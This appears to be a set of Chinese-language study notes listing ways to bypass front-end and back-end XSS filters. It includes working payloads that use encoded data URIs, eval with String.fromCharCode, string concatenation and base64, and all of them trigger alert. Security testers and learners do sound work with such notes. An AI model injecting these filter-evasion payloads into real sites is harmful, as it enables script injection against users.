#### 前端限制绕过
- 限制输入长度
	- 绕过
		- burp抓包绕过
		- 修改前端js代码
		- 禁用js代码
#### 后端限制绕过
- 双写绕过
- html实体化绕过
	- javascript伪代码绕过
- 编码绕过
	- Unicode编码绕过
		- &\#,  &\#x,  \\u可以被浏览器解析但用法有所不同
			-- \\u型无法直接被浏览器解析，需要配合eavl()等函数或者JavaScript伪代码
				- 
			-- &\#,  &\#x可直接使用浏览器可以直接解析
	- url编码绕过(这里是十六进制)
		- `<iframe src= "data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
	- ascii编码绕过使用eval函数
		- `<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">
	- 字符拼接绕过
		- ``<img src="x" onerror="a= `aler` ;b=`t` ;c='(`xss`);';eval(a+b+c)">``
	- base64编码绕过
		- ``<iframe src= "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">``
- 大小写绕过
- JavaScript伪代码绕过
- 标签特性绕过：
	- img标签onerror事件，当src路径错误自动触发onerror
	- a标签 href属性：自动Unicode解码，可以把payload进行Unicode编码绕过。
- 关键词替换：
	- 尝试编码绕过，大小写绕过，使用其它关键词